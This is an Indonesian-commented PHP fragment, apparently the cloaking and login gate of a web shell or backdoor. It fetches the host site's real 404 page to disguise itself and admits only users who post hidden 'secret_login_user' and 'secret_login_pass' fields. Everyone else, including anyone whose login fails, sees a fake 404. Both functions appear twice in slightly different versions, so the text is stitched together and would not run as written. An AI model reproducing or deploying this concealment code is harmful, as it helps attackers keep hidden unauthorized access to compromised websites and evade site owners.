// Fungsi untuk mengambil halaman 404 asli dari domain
function getOriginal404Page() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    
    $random_path = '/404-' . md5(rand() . time() . uniqid()) . '.html';
    $url = $protocol . '://' . $host . $random_path;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0');
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code == 404 && !empty($response)) {
        return $response;
    }
    
    return false;
}

// ====================== FUNGSI LOGIN CHECK ======================
function requireLogin() {
    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;

    // Cek login via POST
    if (isset($_POST['secret_login_user']) && isset($_POST['secret_login_pass'])) {
        $u = $_POST['secret_login_user'];
        $p = $_POST['secret_login_pass'];

        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }

    // Jika belum login, tampilkan 404
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        show404WithLogin();
    }
}

// Fungsi untuk mengambil halaman 404 asli dari domain
function getOriginal404Page() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    
    $random_path = '/404-' . md5(rand() . time() . uniqid()) . '.html';
    $url = $protocol . '://' . $host . $random_path;
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code == 404 && !empty($response)) {
            return $response;
        }
    }
    return false;
}

// ====================== FUNGSI LOGIN CHECK ======================
function requireLogin() {
    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;

    // Cek login via POST
    if (isset($_POST['secret_login_user']) && isset($_POST['secret_login_pass'])) {
        $u = $_POST['secret_login_user'];
        $p = $_POST['secret_login_pass'];

        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            // Login gagal - tetap tampilkan 404
            $_SESSION['login_failed'] = true;
        }
    }

    // Jika belum login atau gagal login, tampilkan 404
    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
        show404WithLogin();
    }
}
